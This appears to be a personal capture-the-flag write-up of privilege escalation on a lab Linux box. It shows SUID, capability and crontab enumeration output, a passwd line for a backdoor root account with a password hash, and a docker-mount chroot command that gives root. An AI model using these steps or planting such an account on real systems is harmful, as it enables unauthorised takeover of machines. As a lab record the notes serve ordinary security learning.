
I think now we got the shell of this box let's do some recon and see what we can do
![[Pasted image 20240818125838.png]]


```
c43l:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:0:0:root:/root:/bin/bash
```


```
www-data@ip-10-201-11-33:/var/www$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/docker
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/at
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chsh
```


```
www-data@ip-10-201-11-33:/var/www$ env
env
PWD=/var/www
APACHE_LOG_DIR=/var/log/apache2
LANG=C
INVOCATION_ID=2806c7ef0c06427c965da7c8024dbae2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
TERM=xterm
term=xterm
APACHE_RUN_GROUP=www-data
APACHE_LOCK_DIR=/var/lock/apache2
SHLVL=3
LC_CTYPE=C.UTF-8
APACHE_RUN_DIR=/var/run/apache2
JOURNAL_STREAM=9:23813
APACHE_RUN_USER=www-data
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OLDPWD=/var/www/html
_=/usr/bin/env
```


```
www-data@ip-10-201-11-33:/var/www$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
www-data@ip-10-201-11-33:/var/www$ 
```


```
www-data@ip-10-201-11-33:/var/www$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

## So it's time to get privilege escalation escalation

Docker
```
docker run -v /:/mnt --rm -it cb1b741122e8 chroot /mnt sh
```

![[Pasted image 20240818160415.png]]

We got the root access
```

```

I was not able to find the root flag so we have repository name with ubuntu 18.04

